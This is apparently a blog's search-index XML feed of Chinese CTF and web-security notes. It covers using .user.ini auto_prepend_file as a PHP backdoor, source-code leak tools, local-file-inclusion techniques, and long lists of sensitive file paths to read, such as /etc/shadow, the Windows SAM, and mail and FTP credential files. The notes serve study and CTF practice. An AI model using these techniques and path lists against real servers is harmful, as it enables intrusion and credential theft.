<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一些关于.user.ini的知识</title>
      <link href="/2021/09/17/yi-xie-guan-yu.user.ini-de-zhi-shi/"/>
      <url>/2021/09/17/yi-xie-guan-yu.user.ini-de-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="一些关于-user-ini的知识"><a href="#一些关于-user-ini的知识" class="headerlink" title="一些关于.user.ini的知识"></a>一些关于.user.ini的知识</h1><h3 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h3><blockquote><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 <em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<a href="https://www.php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER[‘DOCUMENT_ROOT’]</a> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令， <a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.filename" target="_blank" rel="noopener">user_ini.filename</a> 和 <a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl" target="_blank" rel="noopener">user_ini.cache_ttl</a> 控制着用户 INI 文件的使用。</p><p><a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.filename" target="_blank" rel="noopener">user_ini.filename</a> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <code>.user.ini</code>。</p><p><a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl" target="_blank" rel="noopener">user_ini.cache_ttl</a> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式“PHP_INI_PREDIR、PHP_INI_USER”的设置。</p><p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>而且和php.ini不同的是，.user.ini是一个能被动态加载的ini文件，也就是说我们修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>然后我们看到php.ini中的配置项，可惜我沮丧的发现，只要稍微铭感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p><h2 id="配置可被设定范围"><a href="#配置可被设定范围" class="headerlink" title="配置可被设定范围"></a>配置可被设定范围</h2><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916192346022.png" alt="image-20210916192346022"></p><h2 id="如何构造”后门”"><a href="#如何构造”后门”" class="headerlink" title="如何构造”后门”"></a>如何构造”后门”</h2><p>PHP配置项中有两个比较有意思的项</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916195705161.png" alt="image-20210916195705161"></p><ul><li><p>auto_append_file</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916200011574.png" alt="image-20210916200011574"></p></li><li><p>auto_prepend_file</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916200227641.png" alt="image-20210916200227641"></p></li></ul><p><strong>这俩差别在于是在主文件前还是后包含指定文件</strong></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码泄露</title>
      <link href="/2021/09/10/yuan-ma-xie-lu/"/>
      <url>/2021/09/10/yuan-ma-xie-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="Web源码泄露总结"><a href="#Web源码泄露总结" class="headerlink" title="Web源码泄露总结"></a>Web源码泄露总结</h1><h2 id="Git源码泄露"><a href="#Git源码泄露" class="headerlink" title="Git源码泄露"></a>Git源码泄露</h2><ul><li>漏洞成因：运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果该文件没有删除而是直接发布了，那么使用这个文件，就可以回复代码</li><li>漏洞利用：工具：<a href="https://github.com/wangyihang/githacker" target="_blank" rel="noopener">Githacker</a>、Githack</li></ul><h2 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h2><ul><li>漏洞利用：工具：dvcs-ripper、Seay-Svn</li></ul><h2 id="HG源码泄露-目前还未遇到"><a href="#HG源码泄露-目前还未遇到" class="headerlink" title="HG源码泄露(目前还未遇到)"></a>HG源码泄露(目前还未遇到)</h2><ul><li>漏洞成因：hg init的时候会生成.hg</li><li>漏洞利用：工具：dvcs-ripper</li></ul><h2 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h2><p>漏洞利用<br>测试的目录</p><pre><code>http://url/CVS/Root 返回根信息 http://url/CVS/Entries 返回所有文件的结构</code></pre><p>取回源码的命令</p><pre><code>bk clone http://url/name dir</code></pre><p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p><p>查看所有的改变的命令，转到download的目录</p><pre><code>bk changes</code></pre><h2 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h2><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>常见备份文件类型总结* .git .svn  .swp .~bak .bash_history</p><h3 id="phps-dotphps-源码泄露"><a href="#phps-dotphps-源码泄露" class="headerlink" title=".phps(dotphps)源码泄露"></a>.phps(dotphps)源码泄露</h3><ul><li><p>phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。</p></li><li><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p></li><li><p>Mine type: text/html, application/x-httpd-php-source, application/x-httpd-php3-source</p></li><li><p>不是默认存在，只会在特殊情况下存在</p><blockquote><p>参考</p><p><a href="https://filext.com/file-extension/PHPS" target="_blank" rel="noopener">https://filext.com/file-extension/PHPS</a></p><p><a href="https://www.solvusoft.com/zh-cn/file-extensions/file-extension-phps/" target="_blank" rel="noopener">文件扩展名 PHPS</a></p></blockquote></li></ul><h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要包含一下文件或目录：</p><ul><li><p><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p></li><li><p><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p></li><li><p><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p></li><li><p><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</p></li><li><p><code>/WEB-INF/database.properties</code>：数据库配置文件</p><p>漏洞成因：</p><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。<br>漏洞检测以及利用方法：<br>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p></li></ul><p>​    一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx  配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><h2 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title="DS_Store文件泄露"></a>DS_Store文件泄露</h2><ul><li>漏洞成因：在发布代码的时候未删除隐藏文件汇总的.DS_Store文件，然后攻击者获得了敏感文件等信息</li><li>漏洞利用：ds_store_exp</li></ul><h2 id="常见编辑器文件泄露"><a href="#常见编辑器文件泄露" class="headerlink" title="常见编辑器文件泄露"></a>常见编辑器文件泄露</h2><ul><li>vim临时文件(.swp)</li><li>vim备份文件(~)</li></ul><h2 id="Github导致文件泄露"><a href="#Github导致文件泄露" class="headerlink" title="Github导致文件泄露"></a>Github导致文件泄露</h2><blockquote><p>参考</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 源码泄露 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件读取漏洞路径收集</title>
      <link href="/2021/09/10/wen-jian-du-qu-lou-dong-lu-jing-shou-ji/"/>
      <url>/2021/09/10/wen-jian-du-qu-lou-dong-lu-jing-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="文件读取漏洞路径收集"><a href="#文件读取漏洞路径收集" class="headerlink" title="文件读取漏洞路径收集"></a>文件读取漏洞路径收集</h1><pre><code>/etc/passwd/etc/shadow/etc/issue/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/etc/sysconfig/network-scripts/ifcfg-eth0/etc/sysconfig/network-scripts/ifcfg-eth1/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.ini</code></pre><p>1.LINUX常见路径：</p><pre><code>/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.ini</code></pre><p>2..windows常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）</p><pre><code>c:\windows\php.inic:\boot.inic:\1.txtc:\a.txtc:\CMailServer\config.inic:\CMailServer\CMailServer.exec:\CMailServer\WebMail\index.aspc:\program files\CMailServer\CMailServer.exec:\program files\CMailServer\WebMail\index.aspC:\WinWebMail\SysInfo.iniC:\WinWebMail\Web\default.aspC:\WINDOWS\FreeHost32.dllC:\WINDOWS\7i24iislog4.exeC:\WINDOWS\7i24tool.exec:\hzhost\databases\url.aspc:\hzhost\hzclient.exeC:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnkC:\Documents and Settings\All Users\「开始」菜单\程序\Serv-U\Serv-U Administrator.lnkC:\WINDOWS\web.configc:\web\index.htmlc:\www\index.htmlc:\WWWROOT\index.htmlc:\website\index.htmlc:\web\index.aspc:\www\index.aspc:\wwwsite\index.aspc:\WWWROOT\index.aspc:\web\index.phpc:\www\index.phpc:\WWWROOT\index.phpc:\WWWsite\index.phpc:\web\default.htmlc:\www\default.htmlc:\WWWROOT\default.htmlc:\website\default.htmlc:\web\default.aspc:\www\default.aspc:\wwwsite\default.aspc:\WWWROOT\default.aspc:\web\default.phpc:\www\default.phpc:\WWWROOT\default.phpc:\WWWsite\default.phpC:\Inetpub\wwwroot\pagerror.gifc:\windows\notepad.exec:\winnt\notepad.exeC:\Program Files\Microsoft Office\OFFICE10\winword.exeC:\Program Files\Microsoft Office\OFFICE11\winword.exeC:\Program Files\Microsoft Office\OFFICE12\winword.exeC:\Program Files\Internet Explorer\IEXPLORE.EXEC:\Program Files\winrar\rar.exeC:\Program Files\360\360Safe\360safe.exeC:\Program Files\360Safe\360safe.exeC:\Documents and Settings\Administrator\Application Data\360Safe\360Examine\360Examine.logc:\ravbin\store.inic:\rising.iniC:\Program Files\Rising\Rav\RsTask.xmlC:\Documents and Settings\All Users\Start Menu\desktop.iniC:\Documents and Settings\Administrator\My Documents\Default.rdpC:\Documents and Settings\Administrator\Cookies\index.datC:\Documents and Settings\Administrator\My Documents\新建 文本文档.txtC:\Documents and Settings\Administrator\桌面\新建 文本文档.txtC:\Documents and Settings\Administrator\My Documents\1.txtC:\Documents and Settings\Administrator\桌面\1.txtC:\Documents and Settings\Administrator\My Documents\a.txtC:\Documents and Settings\Administrator\桌面\a.txtC:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpgE:\Inetpub\wwwroot\aspnet_client\system_web\1_1_4322\SmartNav.htmC:\Program Files\RhinoSoft.com\Serv-U\Version.txtC:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.iniC:\Program Files\Symantec\SYMEVENT.INFC:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exeC:\Program Files\Microsoft SQL Server\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\MSSQL.2\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\80\Tools\HTML\database.htmC:\Program Files\Microsoft SQL Server\MSSQL\README.TXTC:\Program Files\Microsoft SQL Server\90\Tools\Bin\DdsShapes.dllC:\Program Files\Microsoft SQL Server\MSSQL\sqlsunin.iniC:\MySQL\MySQL Server 5.0\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.iniC:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frmC:\Program Files\MySQL\MySQL Server 5.0\COPYINGC:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sqlC:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exec:\MySQL\MySQL Server 4.1\bin\mysql.exec:\MySQL\MySQL Server 4.1\data\mysql\user.frmC:\Program Files\Oracle\oraconfig\Lpk.dllC:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exeC:\WINDOWS\system32\inetsrv\w3wp.exeC:\WINDOWS\system32\inetsrv\inetinfo.exeC:\WINDOWS\system32\inetsrv\MetaBase.xmlC:\WINDOWS\system32\inetsrv\iisadmpwd\achg.aspC:\WINDOWS\system32\config\default.LOGC:\WINDOWS\system32\config\samC:\WINDOWS\system32\config\systemc:\CMailServer\config.inic:\program files\CMailServer\config.inic:\tomcat6\tomcat6\bin\version.shc:\tomcat6\bin\version.shc:\tomcat\bin\version.shc:\program files\tomcat6\bin\version.shC:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.shc:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.logc:\Apache2\Apache2\bin\Apache.exec:\Apache2\bin\Apache.exec:\Apache2\php\license.txtC:\Program Files\Apache Group\Apache2\bin\Apache.exe/usr/local/tomcat5527/bin/version.sh/usr/share/tomcat6/bin/startup.sh/usr/tomcat6/bin/startup.shc:\Program Files\QQ2007\qq.exec:\Program Files\Tencent\qq\User.dbc:\Program Files\Tencent\qq\qq.exec:\Program Files\Tencent\qq\bin\qq.exec:\Program Files\Tencent\qq2009\qq.exec:\Program Files\Tencent\qq2008\qq.exec:\Program Files\Tencent\qq2010\bin\qq.exec:\Program Files\Tencent\qq\Users\All Users\Registry.dbC:\Program Files\Tencent\TM\TMDlls\QQZip.dllc:\Program Files\Tencent\Tm\Bin\Txplatform.exec:\Program Files\Tencent\RTXServer\AppConfig.xmlC:\Program Files\Foxmal\Foxmail.exeC:\Program Files\Foxmal\accounts.cfgC:\Program Files\tencent\Foxmal\Foxmail.exeC:\Program Files\tencent\Foxmal\accounts.cfgC:\Program Files\LeapFTP 3.0\LeapFTP.exeC:\Program Files\LeapFTP\LeapFTP.exec:\Program Files\GlobalSCAPE\CuteFTP Pro\cftppro.exec:\Program Files\GlobalSCAPE\CuteFTP Pro\notes.txtC:\Program Files\FlashFXP\FlashFXP.iniC:\Program Files\FlashFXP\flashfxp.exec:\Program Files\Oracle\bin\regsvr32.exec:\Program Files\腾讯游戏\QQGAME\readme.txtc:\Program Files\tencent\腾讯游戏\QQGAME\readme.txtc:\Program Files\tencent\QQGAME\readme.txtC:\Program Files\StormII\Storm.exe</code></pre><p>3.网站相对路径:</p><pre><code>/config.php../../config.php../config.php../../../config.php/config.inc.php./config.inc.php../../config.inc.php../config.inc.php../../../config.inc.php/conn.php./conn.php../../conn.php../conn.php../../../conn.php/conn.asp./conn.asp../../conn.asp../conn.asp../../../conn.asp/config.inc.php./config.inc.php../../config.inc.php../config.inc.php../../../config.inc.php/config/config.php../../config/config.php../config/config.php../../../config/config.php/config/config.inc.php./config/config.inc.php../../config/config.inc.php../config/config.inc.php../../../config/config.inc.php/config/conn.php./config/conn.php../../config/conn.php../config/conn.php../../../config/conn.php/config/conn.asp./config/conn.asp../../config/conn.asp../config/conn.asp../../../config/conn.asp/config/config.inc.php./config/config.inc.php../../config/config.inc.php../config/config.inc.php../../../config/config.inc.php/data/config.php../../data/config.php../data/config.php../../../data/config.php/data/config.inc.php./data/config.inc.php../../data/config.inc.php../data/config.inc.php../../../data/config.inc.php/data/conn.php./data/conn.php../../data/conn.php../data/conn.php../../../data/conn.php/data/conn.asp./data/conn.asp../../data/conn.asp../data/conn.asp../../../data/conn.asp/data/config.inc.php./data/config.inc.php../../data/config.inc.php../data/config.inc.php../../../data/config.inc.php/include/config.php../../include/config.php../include/config.php../../../include/config.php/include/config.inc.php./include/config.inc.php../../include/config.inc.php../include/config.inc.php../../../include/config.inc.php/include/conn.php./include/conn.php../../include/conn.php../include/conn.php../../../include/conn.php/include/conn.asp./include/conn.asp../../include/conn.asp../include/conn.asp../../../include/conn.asp/include/config.inc.php./include/config.inc.php../../include/config.inc.php../include/config.inc.php../../../include/config.inc.php/inc/config.php../../inc/config.php../inc/config.php../../../inc/config.php/inc/config.inc.php./inc/config.inc.php../../inc/config.inc.php../inc/config.inc.php../../../inc/config.inc.php/inc/conn.php./inc/conn.php../../inc/conn.php../inc/conn.php../../../inc/conn.php/inc/conn.asp./inc/conn.asp../../inc/conn.asp../inc/conn.asp../../../inc/conn.asp/inc/config.inc.php./inc/config.inc.php../../inc/config.inc.php../inc/config.inc.php../../../inc/config.inc.php/index.php./index.php../../index.php../index.php../../../index.php/index.asp./index.asp../../index.asp../index.asp../../../index.asp</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含总结</title>
      <link href="/2021/09/10/wen-jian-bao-han-zong-jie/"/>
      <url>/2021/09/10/wen-jian-bao-han-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="本地包含漏洞执行任意代码思路"><a href="#本地包含漏洞执行任意代码思路" class="headerlink" title="本地包含漏洞执行任意代码思路"></a>本地包含漏洞执行任意代码思路</h1><ul><li>/proc/self/environ</li><li>包含web server日志文件</li><li>php_error文件内容</li><li>包含其他日志文件</li><li>FTP日志文件内容</li><li>结合phpinfo包含临时文件</li><li>利用工具中的php临时文件</li><li>包含session文件</li></ul><p>待完善</p>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含中的一些问题</title>
      <link href="/2021/09/10/wen-jian-bao-han-zhong-de-yi-xie-wen-ti/"/>
      <url>/2021/09/10/wen-jian-bao-han-zhong-de-yi-xie-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含中的一些问题"><a href="#文件包含中的一些问题" class="headerlink" title="文件包含中的一些问题"></a>文件包含中的一些问题</h1><ul><li><p>PHP中include和require的区别</p><p>参考<a href="https://blog.csdn.net/shenpengchao/article/details/52326233" target="_blank" rel="noopener">PHP中include和require的区别详解</a></p><ul><li>include在用到时加载</li><li>require在一开始就加载</li><li>_once后缀表示已加载的不加载</li><li>PHP系统在加载PHP程序时有一个伪编译过程，可使程序运行加快。但include的文档仍为解释执行。include的文件中出错了，主程序继续往下执行，require的文件出错了，主程序也停了，所以包含的文件出错对系统影响不大的话（如界面文件）就用include，否则用require。</li><li>require()和include()语句是语言结构，不是真正的函数，可以像PHP中其他的语言结构一样，例如echo()可以使用echo(“abc”)形式，也可以使用echo “abc”形式输出字符串abc。require()和include()语句也可以不加圆括号而直接加参数。</li><li>include()执行时需要引用的文件每次都要进行读取和评估，require()执行时需要引用的文件只处理一次（实际上执行时需要引用的文件内容替换了require()语句）可以看出若有包含这些指令之一的代码和可能执行多次的代码，则使用require()效率比较高，若每次执行代码时相读取不同的文件或者有通过一组文件叠代的循环，就使用include()。</li></ul></li><li><p>include(或require)语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用include语句的文件中</p><p>伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2021/09/10/wen-jian-shang-chuan/"/>
      <url>/2021/09/10/wen-jian-shang-chuan/</url>
      
